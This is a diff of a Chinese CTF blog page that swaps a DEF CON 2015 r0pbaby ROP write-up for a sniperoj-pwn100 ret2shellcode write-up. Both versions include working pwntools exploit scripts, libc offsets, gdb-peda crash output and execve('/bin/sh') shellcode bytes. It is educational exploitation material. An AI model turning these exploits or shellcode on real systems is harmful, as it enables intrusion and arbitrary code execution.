@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="pwn,">
+  <meta name="keywords" content="ret2shellcode,">
 
 
 
@@ -79,35 +79,25 @@
 
 
 
-<meta name="description" content="学习一波经典的ROP题目。 题目地址：https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/babys-first/r0pbaby">
-<meta name="keywords" content="pwn">
+<meta name="description" content="题目地址：sniperoj-pwn100-shellcode-x86-64">
+<meta name="keywords" content="ret2shellcode">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ROP_r0pbaby">
-<meta property="og:url" content="https://hc1024.github.io/2019/09/25/ROP-r0pbaby/index.html">
+<meta property="og:title" content="sniperoj-pwn100-shellcode-x86-64">
+<meta property="og:url" content="https://hc1024.github.io/2019/10/19/sniperoj-pwn100-shellcode-x86-64/index.html">
 <meta property="og:site_name" content="HC1024">
-<meta property="og:description" content="学习一波经典的ROP题目。 题目地址：https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/babys-first/r0pbaby">
+<meta property="og:description" content="题目地址：sniperoj-pwn100-shellcode-x86-64">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/W7DT6KqYjOziJAX.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/9EFqd42y5zAiNUe.jpg">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/Y9TX5HQ6rAqeCWl.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/XNL3GmTUg8Exqjf.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/ipmGdBItCvqrW8P.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/FbylUpD8Itwn6oM.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/3dwnQf1E4e8ltgy.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/Q6DPaOCAoLXgMnt.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/XKISZ7tq3u1cW2j.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/YOpX5HcTKh6tnau.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/Amvo4REBFTVzp9S.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/wQFjL2fOEMXCJTl.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/VLRNJSbkdmz7u49.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/6VRyaCZfKIhJ2wb.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/JIp9NdfwLaWmo1X.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/fQmon54hdUajYV3.png">
-<meta property="og:updated_time" content="2019-09-24T18:49:22.000Z">
+<meta property="og:image" content="https://i.loli.net/2019/10/19/mxuWQlXzLKbi8E9.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/19/4TtHoB8YDSac9WM.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/19/dEXrVq4g51oFlQy.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/19/bytknArZ6NFRPoC.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/19/CUEpA9HV4fqlhrN.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/19/C3zki5AwZ4hNB2E.png">
+<meta property="og:updated_time" content="2019-10-19T15:18:15.166Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ROP_r0pbaby">
-<meta name="twitter:description" content="学习一波经典的ROP题目。 题目地址：https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/babys-first/r0pbaby">
-<meta name="twitter:image" content="https://i.loli.net/2019/09/25/W7DT6KqYjOziJAX.png">
+<meta name="twitter:title" content="sniperoj-pwn100-shellcode-x86-64">
+<meta name="twitter:description" content="题目地址：sniperoj-pwn100-shellcode-x86-64">
+<meta name="twitter:image" content="https://i.loli.net/2019/10/19/mxuWQlXzLKbi8E9.png">
 
 
 
@@ -137,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="https://hc1024.github.io/2019/09/25/ROP-r0pbaby/">
+  <link rel="canonical" href="https://hc1024.github.io/2019/10/19/sniperoj-pwn100-shellcode-x86-64/">
 
 
 
 
 
-  <title>ROP_r0pbaby | HC1024</title>
+  <title>sniperoj-pwn100-shellcode-x86-64 | HC1024</title>
   
 
 
@@ -290,7 +280,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hc1024.github.io/2019/09/25/ROP-r0pbaby/">
+    <link itemprop="mainEntityOfPage" href="https://hc1024.github.io/2019/10/19/sniperoj-pwn100-shellcode-x86-64/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="HC">
@@ -307,7 +297,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">ROP_r0pbaby</h1>
+          <h1 class="post-title" itemprop="name headline">sniperoj-pwn100-shellcode-x86-64</h1>
         
 
         <div class="post-meta">
@@ -319,8 +309,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-25T01:20:11+08:00">
-                2019-09-25
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-19T23:03:50+08:00">
+                2019-10-19
               </time>
             
 
@@ -351,7 +341,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  1.2k 
+                  718 
                 </span>
               
 
@@ -367,7 +357,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  4
+                  3
                 </span>
               
             </div>
@@ -388,69 +378,40 @@
       
 
       
-        <p>学习一波经典的ROP题目。</p>
-<p>题目地址：<a href="https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/babys-first/r0pbaby" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/babys-first/r0pbaby</a></p>
+        <p>题目地址：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2shellcode/sniperoj-pwn100-shellcode-x86-64" target="_blank" rel="noopener">sniperoj-pwn100-shellcode-x86-64</a></p>
 <a id="more"></a>
 
-<p><img src="https://i.loli.net/2019/09/25/W7DT6KqYjOziJAX.png" alt="1.png"></p>
-<p>64位的程序</p>
+<p>查看基本信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file shellcode</span><br><span class="line">shellcode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=4600df3dbafbffc6436a38e95b386fc8afbbd63b, not stripped</span><br></pre></td></tr></table></figure>
+
 <p>查看保护：</p>
-<p><img src="https://i.loli.net/2019/09/25/9EFqd42y5zAiNUe.jpg" alt="2.jpg"></p>
-<p>开启了NX（不可执行）+PIE（Position Independnet Code位置无关代码）等安全防护，对于这样的保护机制，绕过的方法是ROP(Return-oriented Programming)，那ROP是什么？</p>
-<p>ROP的核心思想：攻击者扫描已有的<a href="https://baike.baidu.com/item/动态链接库/100352" target="_blank" rel="noopener">动态链接库</a>和可执行文件，提取出可以利用的指令片段(gadget)，这些指令片段均以ret指令结尾，即用ret指令实现指令片段执行流的衔接。</p>
-<p>（往后做的时候遇到一个问题，看别的大佬的wp，有说要关闭ASLR的，把关不关ASLR分成了两种解法，我自己本地试的时候，发现我关了ASLR也没用，exp根本跑不起来，所以我就按有ASLR的解法来了。）</p>
-<p>玩一玩这个程序：</p>
-<p><img src="https://i.loli.net/2019/09/25/Y9TX5HQ6rAqeCWl.png" alt="3.png"></p>
-<p>第一选项打印libc地址</p>
-<p>第二个选项打印system函数地址</p>
-<p>第三个是向栈写数据</p>
-<p>用ida看一下</p>
-<p><img src="https://i.loli.net/2019/09/25/XNL3GmTUg8Exqjf.png" alt="4.png"></p>
-<p><img src="https://i.loli.net/2019/09/25/ipmGdBItCvqrW8P.png" alt="5.png"></p>
-<p>发现危险函数memcpy()，说明存在栈溢出漏洞。</p>
-<p>接下来用gdb调试一下：</p>
-<p><img src="https://i.loli.net/2019/09/25/FbylUpD8Itwn6oM.png" alt="6.png"></p>
-<p><img src="https://i.loli.net/2019/09/25/3dwnQf1E4e8ltgy.png" alt="7.png"></p>
-<p><img src="https://i.loli.net/2019/09/25/Q6DPaOCAoLXgMnt.png" alt="8.png"></p>
-<p>看到程序在0x0000555555554eb3崩溃</p>
-<p><img src="https://i.loli.net/2019/09/25/XKISZ7tq3u1cW2j.png" alt="9.png"></p>
-<p>此时rsp中的值是ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA，来计算一下偏移量:</p>
-<p><img src="https://i.loli.net/2019/09/25/YOpX5HcTKh6tnau.png" alt="10.png"></p>
-<p>所以，ret的地址是以我们输入的偏移量为8的位置来取的。我们这样就可以控制rip了。</p>
-<p>现在来想一下我们该干什么。我们的希望获取一个shell，也就是说要控制程序执行流程，最好能跳转执行system函数。</p>
-<p>所以我们需要构造一个payload让程序执行system(“/bin/sh”)</p>
-<p>接下来我们要做的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">找到&quot;/bin/sh&quot;位置</span><br><span class="line">找到&quot;system函数地址&quot;</span><br><span class="line">寻找合适的gadget，让程序流连接起来</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/10/19/mxuWQlXzLKbi8E9.png" alt="r2sc1.png"></p>
+<p>ida查看反汇编：</p>
+<p><img src="https://i.loli.net/2019/10/19/4TtHoB8YDSac9WM.png" alt="r2sc2.png"></p>
+<p>由图可知，可以覆盖的空间大小为0x40，buf大小为0x10.</p>
+<p>题目没有发现system函数与“/bin/sh”字符串，且没有开启堆栈不可执行的保护，因此我们可以采用直接写入shellcode的方法。</p>
+<p>由于：</p>
+<p><img src="https://i.loli.net/2019/10/19/dEXrVq4g51oFlQy.png" alt="r2sc3.png"></p>
+<p>我们平常所用的shellcode长度太长，需要更换短一点的shellcode。</p>
+<p>下面是两个可以去搜寻shllcode的网址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.exploit-db.com/shellcodes</span><br><span class="line">http://shell-storm.org/shellcode/</span><br></pre></td></tr></table></figure>
 
-<p><strong>寻找gadget</strong>：</p>
-<p>我们要跳转执行的地方，要有两个pop和一个call。先来复习一下64位架构下各寄存器的作用：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%rax 作为函数返回值使用。</span><br><span class="line">%rsp 栈指针寄存器，指向栈顶</span><br><span class="line">%rdi，%rsi，%rdx，%rcx，%r8，%r9 用作函数参数，依次对应第1参数，第2参数。。。</span><br><span class="line">%rbx，%rbp，%r12，%r13，%14，%15 用作数据存储，遵循被调用者使用规则，简单说就是随便用，调用子函数之前要备份它，以防他被修改</span><br><span class="line">%r10，%r11 用作数据存储，遵循调用者使用规则，简单说就是使用之前要先保存原值</span><br></pre></td></tr></table></figure>
+<p>本题用的shellcode是这里找到的：<a href="https://www.exploit-db.com/shellcodes/46907" target="_blank" rel="noopener">https://www.exploit-db.com/shellcodes/46907</a></p>
+<p>shellcode=”\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05”</p>
+<p>接下来应该考虑的是要把shellcode放在那个位置，如果按劫持栈指针的方法，把因为空间不大，可以把shellcoe放在最开头，然后控制程序流跳转执行shellcode。但是本题不可以。原因如下图：</p>
+<p><img src="https://i.loli.net/2019/10/19/bytknArZ6NFRPoC.png" alt="r2sc4.png"></p>
+<p>leave的作用相当于<strong>MOV SP,BP；POP BP。</strong></p>
+<p><img src="https://i.loli.net/2019/10/19/CUEpA9HV4fqlhrN.png" alt="r2sc6.png"></p>
+<p>而shellcode中对sp进行了push操作，所以leave指令会对shellcode的执行造成影响。所以buf中不能存放shellcode，buf后的8个字节也不能存放（这里需要存放返回地址）。</p>
+<p>所以，我们的shellcode只能放在buf首地址后的0x10+8后的地址。</p>
+<p>下面是栈溢出的基本套路：</p>
+<p><strong>1.计算偏移量</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern create 100</span><br><span class="line">&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&apos;</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/hc/study/pwn/stackoverflow/Ret2shellcode/sniperoj-pwn100-shellcode-x86-64/shellcode </span><br><span class="line">Welcome to Sniperoj!</span><br><span class="line">Do your kown what is it : [0x7fffffffdbb0] ?</span><br><span class="line">Now give me your answer : </span><br><span class="line">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x0 </span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x7ffff7af4081 (&lt;__GI___libc_read+17&gt;: cmp    rax,0xfffffffffffff000)</span><br><span class="line">RDX: 0x40 (&apos;@&apos;)</span><br><span class="line">RSI: 0x7fffffffdbb0 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH&quot;)</span><br><span class="line">RDI: 0x0 </span><br><span class="line">RBP: 0x41412d4141434141 (&apos;AACAA-AA&apos;)</span><br><span class="line">RSP: 0x7fffffffdbc8 (&quot;(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH&quot;)</span><br><span class="line">RIP: 0x555555554852 (&lt;main+130&gt;:    ret)</span><br><span class="line">R8 : 0x7ffff7fdf4c0 (0x00007ffff7fdf4c0)</span><br><span class="line">R9 : 0x0 </span><br><span class="line">R10: 0x3 </span><br><span class="line">R11: 0x246 </span><br><span class="line">R12: 0x5555555546a0 (&lt;_start&gt;:  xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffdca0 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x555555554847 &lt;main+119&gt;:   call   0x555555554670 &lt;read@plt&gt;</span><br><span class="line">   0x55555555484c &lt;main+124&gt;:   mov    eax,0x0</span><br><span class="line">   0x555555554851 &lt;main+129&gt;:   leave  </span><br><span class="line">=&gt; 0x555555554852 &lt;main+130&gt;:   ret    </span><br><span class="line">   0x555555554853:  nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x55555555485d:  nop    DWORD PTR [rax]</span><br><span class="line">   0x555555554860 &lt;__libc_csu_init&gt;:    push   r15</span><br><span class="line">   0x555555554862 &lt;__libc_csu_init+2&gt;:  push   r14</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdbc8 (&quot;(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH&quot;)</span><br><span class="line">0008| 0x7fffffffdbd0 (&quot;A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH&quot;)</span><br><span class="line">0016| 0x7fffffffdbd8 (&quot;AA0AAFAAbAA1AAGAAcAA2AAH&quot;)</span><br><span class="line">0024| 0x7fffffffdbe0 (&quot;bAA1AAGAAcAA2AAH&quot;)</span><br><span class="line">0032| 0x7fffffffdbe8 (&quot;AcAA2AAH&quot;)</span><br><span class="line">0040| 0x7fffffffdbf0 --&gt; 0x0 </span><br><span class="line">0048| 0x7fffffffdbf8 --&gt; 0x7f5085ea1bc1eb88 </span><br><span class="line">0056| 0x7fffffffdc00 --&gt; 0x5555555546a0 (&lt;_start&gt;:  xor    ebp,ebp)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x0000555555554852 in main ()</span><br><span class="line">gdb-peda$ pattern offset (AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH</span><br><span class="line">(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH found at offset: 24</span><br></pre></td></tr></table></figure>
 
-<p>rdi是传第一个参数的，那么我们要寻找的gadget至少有一个pop  rdi，我们可以用ida在libc中来找：</p>
-<p>我们使用的libc是：libc-2.27.so</p>
-<p><img src="https://i.loli.net/2019/09/25/Amvo4REBFTVzp9S.png" alt="11.png"></p>
-<p><img src="https://i.loli.net/2019/09/25/wQFjL2fOEMXCJTl.png" alt="12.png"></p>
-<p>找到了符合的。</p>
-<p><strong>寻找”/bin/sh”:</strong></p>
-<p>用ida ：</p>
-<p>用ida打开libc-2.27.so，shift + f12 ,ctrl + f 搜索”/bin/sh’</p>
-<p><img src="https://i.loli.net/2019/09/25/VLRNJSbkdmz7u49.png" alt="13.png"></p>
-<p>或：</p>
-<p><img src="https://i.loli.net/2019/09/25/6VRyaCZfKIhJ2wb.png" alt="14.png"></p>
-<p>区别在于ida找到的是程序未加载到内存时的地址，第二种方法找到的是在内存中的地址。如果开启了ASLR，还是用ida吧。</p>
-<p><strong>寻找system：</strong></p>
-<p>ida打开libc-2.27.so，搜索字符串”system”</p>
-<p><img src="https://i.loli.net/2019/09/25/JIp9NdfwLaWmo1X.png" alt="15.png"></p>
-<p><strong>构造payload：</strong></p>
-<p>“A”*8 + p64(ppc) + p64(sys_addr) + p64(binsh_addr) </p>
-<p>关于这个顺序，我的理解是，因为我们找到的gadget的是先pop rax，再pop rdi，也就是说，当程序跳转到这一块时，先要执行pop rax，又因为rax用来传递函数地址，而且后面还要call rax，那接下来跟的就只能是system函数的地址，pop rdi，就把”/bin/sh”用rdi传过去。</p>
-<p>好了，到这里我们粗略的完成了payload的构造，接下来要考虑的具体一点。</p>
-<p>我们默认是开启了ASLR保护的，程序运行后，我们上面找到的地址就发生变化了，那么程序运行我们如何定位我们需要的地址呢？</p>
-<p>我们知道在程序未加载到内存中时，system在libc中的地址，我们也知道ppc和binsh在libc中的地址，那么就通过计算它们相对于libc_system的偏移，加载到内存中后就可以表示成system运行后的地址+偏移了。而system函数运行后的地址可以通过程序第二个选项来获得。</p>
-<p><strong>编写exp:</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./r0pbaby&apos;)</span><br><span class="line">def get_system_addr():</span><br><span class="line">    sh.recvuntil(&apos;: &apos;)</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(&apos;system&apos;)</span><br><span class="line">    addr = sh.recvline().split(&apos;0x&apos;)[1].split(&apos;\n&apos;)[0]</span><br><span class="line">    return addr</span><br><span class="line">    </span><br><span class="line">def send_paylaod(sys_addr,binsh_off,ppc_off):</span><br><span class="line">    payload = &apos;A&apos; * 8 + p64(sys_addr + ppc_off) + p64(sys_addr) + p64(sys_addr + binsh_off)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(str(len(payload)))</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    return</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    sys_addr = int(get_system_addr(),16)</span><br><span class="line">    #print sys_addr</span><br><span class="line">    libc_sys_addr = 0x4F440</span><br><span class="line">    libc_binsh_addr = 0x1B3E9A</span><br><span class="line">    libc_ppc_addr = 0x12188B</span><br><span class="line">    binsh_off = libc_binsh_addr - libc_sys_addr</span><br><span class="line">    ppc_off = libc_ppc_addr - libc_sys_addr</span><br><span class="line">    send_paylaod(sys_addr,binsh_off,ppc_off)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p><strong>2.编写exp</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./shellcode&apos;)</span><br><span class="line"></span><br><span class="line">shellcode = &apos;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&apos;</span><br><span class="line">p.recvuntil(&apos;[&apos;)</span><br><span class="line">buf_addr = p.recvuntil(&apos;]&apos;,drop=True)</span><br><span class="line">p.recv()</span><br><span class="line">#print type(buf_addr)</span><br><span class="line"></span><br><span class="line">payload = &apos;A&apos;*24 + p64(int(buf_addr,16) + 32) + shellcode</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2019/09/25/fQmon54hdUajYV3.png" alt="16.png"></p>
+<p><img src="https://i.loli.net/2019/10/19/C3zki5AwZ4hNB2E.png" alt="r2sc5.png"></p>
 
       
     </div>
@@ -468,7 +429,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
+            <a href="/tags/ret2shellcode/" rel="tag"># ret2shellcode</a>
           
         </div>
       
@@ -481,8 +442,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/09/12/hello-world/" rel="next" title="hello world">
-                <i class="fa fa-chevron-left"></i> hello world
+              <a href="/2019/10/19/bamboofox-ret2text/" rel="next" title="bamboofox-ret2text">
+                <i class="fa fa-chevron-left"></i> bamboofox-ret2text
               </a>
             
           </div>
@@ -490,10 +451,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/10/16/b0verfl0w-X-CTF-Quals-2016/" rel="prev" title="b0verfl0w_X-CTF Quals 2016">
-                b0verfl0w_X-CTF Quals 2016 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
